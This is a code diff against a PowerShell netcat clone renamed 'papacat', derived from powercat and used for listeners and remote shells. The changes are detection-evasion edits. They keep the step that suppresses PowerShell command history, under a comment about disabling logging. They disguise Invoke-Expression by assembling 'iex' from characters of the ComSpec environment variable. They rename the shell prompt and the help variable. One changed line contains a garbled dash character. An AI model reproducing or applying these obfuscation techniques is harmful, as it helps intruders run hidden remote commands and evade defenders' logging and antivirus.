@@ -69,7 +69,7 @@
 
 
 #Disable Powershell Command Logging for current session.
-Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
+Set-PSReadlineOption â€“HistorySaveStyle SaveNothing|Out-Null
 function papacat
 {
   param(
@@ -96,8 +96,7 @@ function papacat
   if($h)
   {
      ############### HELP ###############
-     #return $Help
-$Help = @"
+$HelpBanner = @"
 
    pow`er`cat - Netcat, The Powershell Version
    Github Repository: https://github.com/besimorhino/powe`rc`at
@@ -167,7 +166,7 @@ $Help = @"
          papacat -l -p 8000 -ep -rep -v
 
 "@;
-  Write-Host "$Help"
+  Write-Host "$HelpBanner"
   }
   ############### HELP ###############
 
@@ -537,7 +536,7 @@ $Help = @"
         if(!$l){$Socket.Close()}
         else{$Socket.Stop()}
         $Stopwatch.Stop()
-        Write-Verbose "Timeout!" ; break
+        Write-Verbose "Timeout! $t (sec)" ; break
         break
       }
       if($Handle.IsCompleted)
@@ -558,7 +557,7 @@ $Help = @"
           $Client = $Socket.EndAcceptTcpClient($Handle)
           $Stream = $Client.GetStream()
           $BufferSize = $Client.ReceiveBufferSize
-          Write-Verbose ("Connection from [" + $Client.Client.RemoteEndPoint.Address.IPAddressToString + "] port " + $port + " [tcp] accepted (source port " + $Client.Client.RemoteEndPoint.Port + ")")
+          Write-Verbose ("Connection from [" + $Client.Client.RemoteEndPoint.Address.IPAddressToString + "] port " + $Client.Client.RemoteEndPoint.Port + " [tcp] accepted")
         }
         break
       }
@@ -687,8 +686,8 @@ $Help = @"
       Write-Verbose "Setting up Stream 2... (ESC/CTRL to exit)"
       try
       {
-        $IntroPrompt = $Encoding.GetBytes("Windows PowerShell`nCopyright (C) 2013 Microsoft Corporation. All rights reserved.`n`n" + ("PS " + (pwd).Path + "> "))
-        $Prompt = ("PS " + (pwd).Path + "> ")
+        $IntroPrompt = $Encoding.GetBytes("Windows PowerShell`nCopyright (C) 2013 Microsoft Corporation. All rights reserved.`n`n" + ("Papacat " + (Get-Location).Path + "> "))
+        $Prompt = ("Papacat " + (Get-Location).Path + "> ")
         $CommandToExecute = ""      
         $Data = $null
       }
@@ -1005,14 +1004,14 @@ $Help = @"
     {
       while($True)
       {
-        $Output += I`E`X $InvokeString
+        $Output += &($Env:ComSpec[4,15,25] -Join '') $InvokeString
         Start-Sleep -s 2
         Write-Verbose "Repetition Enabled: Restarting..."
       }
     }
     else
     {
-      $Output += I`E`X $InvokeString
+      $Output += &($Env:ComSpec[4,15,25] -Join '') $InvokeString
     }
   }
   finally
